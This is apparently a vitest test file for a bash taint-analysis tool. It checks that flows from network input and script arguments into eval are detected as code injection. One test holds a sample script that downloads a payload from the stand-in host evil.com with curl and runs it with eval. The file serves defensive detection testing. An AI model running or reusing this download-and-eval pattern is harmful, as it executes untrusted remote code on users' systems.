/**
 * Tests for bash taint flow end-to-end finding generation (P2 FP precision).
 *
 * Verifies that the full taint pipeline (source detection → DFG → propagation)
 * produces taint flows for bash scripts with dangerous sink patterns.
 */

import { describe, it, expect, beforeAll } from 'vitest';
import { initAnalyzer, analyze } from '../../src/analyzer.js';

describe('Bash taint flow end-to-end', () => {
  beforeAll(async () => {
    await initAnalyzer();
  });

  it('should produce taint flow for curl→eval (network_input → code_injection)', async () => {
    const code = '#!/bin/bash\nPAYLOAD=$(curl -s "http://evil.com/payload")\neval "$PAYLOAD"';
    const result = await analyze(code, 'script.sh', 'bash');

    expect(result.taint.sources.some(s => s.type === 'network_input')).toBe(true);
    expect(result.taint.sinks.some(s => s.method === 'eval')).toBe(true);

    const taintFlows = result.taint.flows ?? [];
    expect(taintFlows.length).toBeGreaterThan(0);
    expect(taintFlows[0].sink_type).toBe('code_injection');
  });

  it('should produce taint flow for $1→eval (io_input → code_injection)', async () => {
    const code = '#!/bin/bash\nuser="$1"\neval "echo $user"';
    const result = await analyze(code, 'script.sh', 'bash');

    const taintFlows = result.taint.flows ?? [];
    expect(taintFlows.length).toBeGreaterThan(0);
    expect(taintFlows[0].source_type).toBe('io_input');
    expect(taintFlows[0].sink_type).toBe('code_injection');
  });

  it('should NOT produce taint flow for constant→eval (no tainted source)', async () => {
    const code = '#!/bin/bash\nSAFE="echo hello"\neval "$SAFE"';
    const result = await analyze(code, 'script.sh', 'bash');

    const taintFlows = result.taint.flows ?? [];
    // Constant value "echo hello" is not tainted — no flow expected
    expect(taintFlows.length).toBe(0);
  });

  it('bash call extraction: eval args start at position 0 (not command name)', async () => {
    const code = '#!/bin/bash\neval "echo hello"';
    const result = await analyze(code, 'script.sh', 'bash');

    const evalCalls = result.calls.filter(c => c.method_name === 'eval');
    expect(evalCalls).toHaveLength(1);
    // The argument should be at position 0 (not the command name)
    expect(evalCalls[0].arguments.length).toBe(1);
    expect(evalCalls[0].arguments[0].position).toBe(0);
    expect(evalCalls[0].arguments[0].expression).toContain('echo hello');
  });
});
